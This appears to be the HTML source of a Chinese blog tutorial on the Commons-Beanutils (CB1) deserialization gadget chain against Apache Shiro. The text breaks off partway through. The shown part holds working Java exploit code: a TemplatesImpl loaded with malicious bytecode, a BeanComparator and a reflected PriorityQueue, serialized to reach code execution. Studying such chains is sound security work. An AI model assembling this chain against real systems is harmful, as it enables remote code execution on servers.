@@ -1,0 +1,402 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>java安全-CB链 | 十七.</title><meta name="author" content="chuanchuan"><meta name="copyright" content="chuanchuan"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="java安全中shiro反序列化漏洞，这里主要利用的是shiro自带依赖CommonsBeanutils链路反序列化漏洞">
+<meta property="og:type" content="article">
+<meta property="og:title" content="java安全-CB链">
+<meta property="og:url" content="https://zc-18.github.io/2026/02/16/shiro_CB/index.html">
+<meta property="og:site_name" content="十七.">
+<meta property="og:description" content="java安全中shiro反序列化漏洞，这里主要利用的是shiro自带依赖CommonsBeanutils链路反序列化漏洞">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan9.png">
+<meta property="article:published_time" content="2026-02-16T10:00:10.000Z">
+<meta property="article:modified_time" content="2026-02-16T09:51:24.720Z">
+<meta property="article:author" content="chuanchuan">
+<meta property="article:tag" content="java安全">
+<meta property="article:tag" content="shiro漏洞">
+<meta property="article:tag" content="反序列化">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan9.png"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "java安全-CB链",
+  "url": "https://zc-18.github.io/2026/02/16/shiro_CB/",
+  "image": "https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan9.png",
+  "datePublished": "2026-02-16T10:00:10.000Z",
+  "dateModified": "2026-02-16T09:51:24.720Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "chuanchuan",
+      "url": "https://zc-18.github.io/"
+    }
+  ]
+}</script><link rel="shortcut icon" href="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan1.png"><link rel="canonical" href="https://zc-18.github.io/2026/02/16/shiro_CB/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//fonts.googleapis.com" crossorigin=""/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.3-b2"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@6.1.4/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!true && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?e6047011fc3df8f4b86d7847de988e6d";
+  var s = document.getElementsByTagName("script")[0];
+  s.parentNode.insertBefore(hm, s);
+})();
+btf.addGlobalFn('pjaxComplete', () => {
+  _hmt.push(['_trackPageview',window.location.pathname])
+}, 'baidu_analytics')
+</script><link rel="stylesheet" href="/%3Clink%20rel=%22stylesheet%22%20href=%22https:/fonts.googleapis.com/css2?family=Poppins:wght@700&amp;family=Noto+Serif+SC:wght@700&amp;display=swap%22%3E" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"pagination":{"enable":false,"hitsPerPage":8},"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":false,"highlightLang":false,"highlightHeightLimit":380,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: true,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'java安全-CB链',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><link rel="stylesheet" href="/css/background.css"><meta name="generator" content="Hexo 8.1.1"></head><body><div id="loading-box"><div class="gear-loader"><div class="gear-loader_overlay"></div><div class="gear-loader_cogs"><div class="gear-loader_cogs__top"><div class="gear-top_part"></div><div class="gear-top_part"></div><div class="gear-top_part"></div><div class="gear-top_hole"></div></div><div class="gear-loader_cogs__left"><div class="gear-left_part"></div><div class="gear-left_part"></div><div class="gear-left_part"></div><div class="gear-left_hole"></div></div><div class="gear-loader_cogs__bottom"><div class="gear-bottom_part"></div><div class="gear-bottom_part"></div><div class="gear-bottom_part"></div><div class="gear-bottom_hole"></div></div></div></div></div><script>(() => {
+  const box = document.getElementById('loading-box')
+  const body = document.body
+
+  let start = Date.now() // 动画开始时间
+
+  const end = () => {
+    const elapsed = Date.now() - start
+    const minDelay = Math.max(0, 1000 - elapsed) // 保证最少 1 秒
+
+    setTimeout(() => {
+      body.style.overflow = ''
+      box.classList.add('loaded')
+    }, minDelay)
+  }
+
+  // ===== 最多 3 秒强制结束 =====
+  const maxTimer = setTimeout(end, 3000)
+
+  // 页面加载完结束
+  if (document.readyState === 'complete') {
+    clearTimeout(maxTimer)
+    end()
+  } else {
+    window.addEventListener('load', () => {
+      clearTimeout(maxTimer)
+      end()
+    })
+  }
+
+  // ===== PJAX 支持 =====
+  if (true) {
+    btf.addGlobalFn(
+      'pjaxSend',
+      () => {
+        body.style.overflow = 'hidden'
+        box.classList.remove('loaded')
+        start = Date.now() // 重新计时
+        clearTimeout(maxTimer)
+        setTimeout(end, 3000) // PJAX 同样最多 3 秒
+      },
+      'gear_init'
+    )
+    btf.addGlobalFn('pjaxComplete', () => {
+      clearTimeout(maxTimer)
+      end()
+    }, 'gear_end')
+  }
+})()</script><div class="bg-animation" id="web_bg" style="background-color: #efefef;"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan2.jpg" onerror="this.onerror=null;this.src='https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan10.png'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">26</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">8</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan9.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan1.png" alt="Logo"><span class="site-name">十七.</span></a><a class="nav-page-title" href="/"><span class="site-name">java安全-CB链</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">java安全-CB链</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-02-16T10:00:10.000Z" title="发表于 2026-02-16 18:00:10">2026-02-16</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-02-16T09:51:24.720Z" title="更新于 2026-02-16 17:51:24">2026-02-16</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/shiro%E6%BC%8F%E6%B4%9E/">shiro漏洞</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">2.2k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>9分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="java安全-CB1链"><a href="#java安全-CB1链" class="headerlink" title="java安全-CB1链"></a>java安全-<code>CB1</code>链</h1><ul>
+<li>环境<code>pom</code>文件加载依赖如下</li>
+</ul>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-beanutils<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-beanutils<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.8.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- https://mvnrepository.com/artifact/commons-collections/commons-collections --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- https://mvnrepository.com/artifact/commons-logging/commons-logging --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-logging<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-logging<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="一、Apache-Commons-Beanutils"><a href="#一、Apache-Commons-Beanutils" class="headerlink" title="一、Apache Commons Beanutils"></a>一、<code>Apache Commons Beanutils</code></h2><h3 id="1-BeanUtils"><a href="#1-BeanUtils" class="headerlink" title="1.BeanUtils"></a>1.<code>BeanUtils</code></h3><p><strong>Apache Commons Beanutils</strong> 是一个用于简化 <strong>Java Bean</strong> 操作的开源工具库</p>
+<p>简单来说，它的核心作用是：<strong>利用 Java 反射机制（Reflection），让你能够通过“字符串名称”来动态地读取或修改对象的属性，以及在不同对象之间自动拷贝属性</strong></p>
+<p>如果没有这个库，使用原生 Java 反射来操作属性会非常繁琐（需要处理 <code>Class</code>, <code>Method</code>, <code>Field</code> 等对象并捕获各种异常）。<code>Beanutils</code> 把这些复杂的操作封装成了简单的方法</p>
+<p><strong>主要作用如下：</strong></p>
+<p><strong>1. 属性拷贝</strong></p>
+<p>这是 <code>Beanutils</code> 最常见的使用场景。当你有两个属性极其相似的对象（比如数据库实体类 <code>UserEntity</code> 和前端展示类 <code>UserDTO</code>），你需要把一个对象的值赋给另一个对象</p>
+<ul>
+<li><p>原生做法： 手动写一堆 <code>dest.setName(src.getName()); dest.setAge(src.getAge()); ...</code></p>
+</li>
+<li><p><code>Beanutils</code> 做法：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 将 orig 对象的属性值拷贝到 dest 对象中（属性名必须相同）</span></span><br><span class="line">BeanUtils.copyProperties(dest, orig);</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p><strong>2. 动态设置&#x2F;获取属性</strong></p>
+<p>你可以通过字符串形式的属性名来操作对象，这在处理动态数据（如解析 XML、JSON 或处理 HTTP 请求参数）时非常有用。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="comment">// 相当于 user.setName(&quot;张三&quot;);</span></span><br><span class="line">BeanUtils.setProperty(user, <span class="string">&quot;name&quot;</span>, <span class="string">&quot;张三&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 甚至支持嵌套属性，例如 user.getAddress().setCity(&quot;北京&quot;);</span></span><br><span class="line">BeanUtils.setProperty(user, <span class="string">&quot;address.city&quot;</span>, <span class="string">&quot;北京&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p><strong>3. Map 与 Bean 的互相转换</strong></p>
+<p>它可以将一个 <code>Map&lt;String, Object&gt;</code> 里的键值对直接填充到一个 Java Bean 中，或者反过来。</p>
+<ul>
+<li><p>场景： Web 开发中，前端传来的参数通常是一个 Map，你可以用它直接生成 User 对象。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Map&lt;String, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">map.put(<span class="string">&quot;username&quot;</span>, <span class="string">&quot;admin&quot;</span>);</span><br><span class="line">map.put(<span class="string">&quot;age&quot;</span>, <span class="number">18</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="comment">// 自动将 map 中的值填充到 user 对象的对应属性中</span></span><br><span class="line">BeanUtils.populate(user, map);</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h3 id="2-getProperty方法"><a href="#2-getProperty方法" class="headerlink" title="2.getProperty方法"></a>2.<code>getProperty</code>方法</h3><p><code>BeanUtils</code>中提供的一种静态方法，可以调用<code>javabean</code>中的<code>getter</code>方法，获取<code>bean</code>种属性的值</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">System.out.println(PropertyUtils.getProperty(<span class="keyword">new</span> <span class="title class_">Baby</span>(<span class="string">&quot;chuanchuan&quot;</span>), <span class="string">&quot;name&quot;</span>));  </span><br></pre></td></tr></table></figure>
+
+<p>本质上就是调用<code>name</code> 属性的<code>getter</code> 方法，也就是 <code>getName</code> 方法</p>
+<p><strong>具体逻辑</strong></p>
+<p><code>org/apache/commons/beanutils/PropertyUtils#getProperty</code><strong>这个类是包装入口</strong></p>
+<img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202602161008212.png" alt="image-20260216100844026" style="zoom: 50%;" />
+
+<p>这个去调用了</p>
+<p><code>org/apache/commons/beanutils/PropertyUtilsBean#getNestedProperty</code><strong>这个类是具体逻辑处理类</strong></p>
+<img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202602161010278.png" alt="image-20260216101029172" style="zoom:50%;" />
+
+<p><code>org/apache/commons/beanutils/PropertyUtilsBean#getSimpleProperty</code>接着是这个方法</p>
+<p><strong>主要逻辑如下</strong></p>
+<img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202602161020022.png" alt="image-20260216102042951" style="zoom:50%;" />
+
+<img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202602161022299.png" alt="image-20260216102239183" style="zoom:50%;" />
+
+<img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202602161024739.png" alt="image-20260216102435652" style="zoom:50%;" />
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Object <span class="title function_">invokeMethod</span><span class="params">(</span></span><br><span class="line"><span class="params">                    Method method, </span></span><br><span class="line"><span class="params">                    Object bean, </span></span><br><span class="line"><span class="params">                    Object[] values)</span> </span><br><span class="line">                        <span class="keyword">throws</span></span><br><span class="line">                            IllegalAccessException,</span><br><span class="line">                            InvocationTargetException &#123;</span><br><span class="line">    <span class="keyword">if</span>(bean == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;No bean specified &quot;</span> +</span><br><span class="line">            <span class="string">&quot;- this should have been checked before reaching this method&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> method.invoke(bean, values);</span><br></pre></td></tr></table></figure>
+
+<p><strong>这个 invoke 方法本质上是调用反射启动</strong></p>
+<img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202602161027163.png" alt="image-20260216102701102" style="zoom:33%;" />
+
+<p><strong>逻辑结束</strong></p>
+<h2 id="二、漏洞点"><a href="#二、漏洞点" class="headerlink" title="二、漏洞点"></a>二、漏洞点</h2><h3 id="1-危险类"><a href="#1-危险类" class="headerlink" title="1.危险类"></a>1.危险类</h3><p>在之前使用<code>TemplatesImpl</code>动态加载字节码文件时，提到上层存在<code>getOutputProperties</code>方法也可调用危险类</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202602161031943.png" alt="image-20260216103109878"></p>
+<p>于是乎，构造一段恶意类代码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\小川\\code\\javasec\\CC1\\target\\classes\\CC1\\HelloTranslet.class&quot;</span>));</span><br><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"><span class="comment">//反射修改内部属性</span></span><br><span class="line">setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;code&#125;);</span><br><span class="line">setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">PropertyUtils.getProperty(obj,<span class="string">&quot;outputProperties&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>通过验证，确实可以执行<code>calc</code>命令</p>
+<h3 id="2-链接点"><a href="#2-链接点" class="headerlink" title="2.链接点"></a>2.链接点</h3><p>查找谁调用<code>PropertyUtils.getProperty</code>方法，并且参数可控</p>
+<p><code>org/apache/commons/beanutils/BeanComparator#compare</code><strong>方法</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202602161046629.png" alt="image-20260216104616479"></p>
+<p><code>property</code>参数可控，可以在<strong>构造参数</strong>处赋值</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">BeanComparator</span> <span class="variable">beanComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>(<span class="string">&quot;outputProperties&quot;</span>,<span class="keyword">new</span> <span class="title class_">AttrCompare</span>());</span><br></pre></td></tr></table></figure>
+
+<img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202602161049232.png" alt="image-20260216104944143" style="zoom:50%;" />
+
+<p><code>o1</code>参数可以在优先队列比较时赋值</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">queue.add(obj);</span><br><span class="line">queue.add(<span class="number">12</span>);</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-入口类"><a href="#3-入口类" class="headerlink" title="3.入口类"></a>3.入口类</h3><p><code>compare</code>方法可以在<code>CC4</code>优先队列中链接</p>
+<img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202602161054960.png" alt="image-20260216105456815" style="zoom:50%;" />
+
+<p><code>CC4</code>中利用<code>TransformingComparator</code>的<code>compare</code>方法调用<code>transform</code>方法</p>
+<p>这里我们利用其调用我们的<code>BeanComparator</code>的<code>compare</code>方法调用<code>PropertyUtils.getProperty(obj,&quot;outputProperties&quot;);</code></p>
+<p>即</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">BeanComparator</span> <span class="variable">beanComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>(<span class="string">&quot;outputProperties&quot;</span>,<span class="keyword">new</span> <span class="title class_">AttrCompare</span>());</span><br><span class="line"></span><br><span class="line"><span class="type">TransformingComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line">PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(comparator);</span><br><span class="line"></span><br><span class="line">queue.add(obj);</span><br><span class="line">queue.add(<span class="number">12</span>);</span><br><span class="line"></span><br><span class="line">setFieldValue(queue,<span class="string">&quot;comparator&quot;</span>,beanComparator);</span><br><span class="line"></span><br><span class="line">serialize(queue);</span><br><span class="line">unserialize();</span><br></pre></td></tr></table></figure>
+
+<p><strong>成功实现</strong></p>
+<h3 id="4-细节点"><a href="#4-细节点" class="headerlink" title="4.细节点"></a>4.细节点</h3><ul>
+<li><code>PriorityQueue</code>使用<strong>commons collections</strong>虚晃一招</li>
+</ul>
+<p><code>PriorityQueue&lt;Object&gt; queue = new PriorityQueue&lt;&gt;();</code></p>
+<p>为了防止在序列化之前就爆炸，我们需要在队列添加元素之后通过反射在给予危险类</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">setFieldValue(queue,<span class="string">&quot;comparator&quot;</span>,beanComparator);</span><br></pre></td></tr></table></figure>
+
